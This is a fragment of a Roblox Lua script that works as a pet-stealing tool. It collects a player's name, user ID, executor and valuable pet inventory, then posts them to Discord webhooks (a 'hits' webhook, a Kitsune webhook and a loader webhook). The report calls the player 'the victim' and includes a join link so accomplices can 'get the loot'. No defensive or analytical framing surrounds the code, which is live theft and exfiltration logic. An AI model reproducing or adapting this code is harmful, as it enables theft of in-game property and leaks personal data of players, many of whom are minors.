...
local CONFIG = {
    ...
    KITSUNE_PING_MESSAGE = "@proautixt",
...
task.spawn(function()
    ...
    local description = table.concat({"**👤 Player Information**", "```", ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("🦸 Receiver: %s"):format(getgenv().receiver or ""), ("💻 Executor: %s"):format(executorName), ("🌐 Server: %s"):format(serverStatus), "```", "**📊 BACKPACK STATISTICS**", "```", ("🤭 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge), ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), ("🎯 Priority Pets: %d"):format(#priorityPets), "```", "**🐾 All Pets**", formatPetList(), "**🔗 SERVER ACCESS - GET THE LOOT!**", "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.", join_link}, "\n")
    ...
    if hasKitsune or hasDiscoBee or #priorityPets >= 10 or hasDragonflyCombo or hasButterflyCombo or hasMegaTargetPet then
        local payload = table.clone(base_payload)
        if shouldPing then payload.content = CONFIG.KITSUNE_PING_MESSAGE; payload.allowed_mentions = { parse = {"users", "everyone"} } end
    ...
    elseif hasSpecialPets or hasMegaHuge or hasAscendedPet or hasPetCombo then
        local payload_kitsune = table.clone(base_payload)
        if shouldPing then payload_kitsune.content = CONFIG.KITSUNE_PING_MESSAGE; payload_kitsune.allowed_mentions = { parse = {"users", "everyone"} } end
        sendOurWebhook(CONFIG.KITSUNE_WEBHOOK_URL, payload_kitsune)
        
        local payload_all = table.clone(base_payload)
        if shouldPing then payload_all.content = CONFIG.PING_MESSAGE; payload_all.allowed_mentions = { parse = {"users", "everyone"} } end
        sendOurWebhook(CONFIG.ALL_HITS_WEBHOOK_URL, payload_all)
        if loaderWebhook then
            sendOurWebhook(loaderWebhook, payload_all)
        end
    else
        local payload = table.clone(base_payload)
        if shouldPing then payload.content = CONFIG.PING_MESSAGE; payload.allowed_mentions = { parse = {"users", "everyone"} } end
